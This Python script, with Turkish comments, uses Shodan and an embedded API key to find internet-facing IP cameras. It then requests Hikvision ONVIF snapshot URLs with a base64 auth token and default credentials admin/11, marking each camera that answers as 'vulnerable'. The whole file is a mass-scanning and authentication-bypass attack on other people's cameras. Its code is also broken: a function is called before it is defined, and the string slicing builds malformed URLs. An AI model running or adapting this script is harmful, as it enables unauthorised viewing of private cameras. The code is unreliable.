import requests
from requests.auth import HTTPBasicAuth
import shodan
import time

api = shodan.Shodan("4Y2JH2Yu76vgLmnUW78X5JV45xcKXfGz")

try:
    de = input("Shodan(s) or Manuel ip(m) :")
    if de == "s":
        a = request_page_from_shodan("ip camera")
    else:
        ip = input("Give me hikvision camera ip: ")
except Exception as e:
    print("Error: ", e)

def request_page_from_shodan(query):
    while True:
        try:
            instances = api.search(query)
            return instances
        except shodan.APIError as e:
            print(f"Error: {e}")
            time.sleep(5)

x = request_page_from_shodan("ip camera")
print(x)

url = "http:///onvif-http/snapshot?auth=YWRtaW46MTEK"

user = "admin"
password = "11"

def main():
    for result in x["matches"]:
        try:
            # Shodan'dan alınan IP'yi URL'ye ekliyoruz
            target_url = url[:6] + result['ip_str'] + url[37:]
            response = requests.get(target_url, auth=HTTPBasicAuth(user, password), timeout=5)
            if response.status_code == 200:
                print(f"Camera at {result['ip_str']} is vulnerable")
            else:
                print(f"Camera at {result['ip_str']} is not vulnerable")
        except Exception as e:
            print("Error: ", e)

    try:
        target_url = url[:6] + ip + url[37:]
        response = requests.get(target_url, auth=HTTPBasicAuth(user, password), timeout=5)
        if response.status_code == 200:
            print(f"Camera at {ip} is vulnerable")
        else:
            print(f"Camera at {ip} is not vulnerable")
    except Exception as x:
        print("Error: ", x)

main()
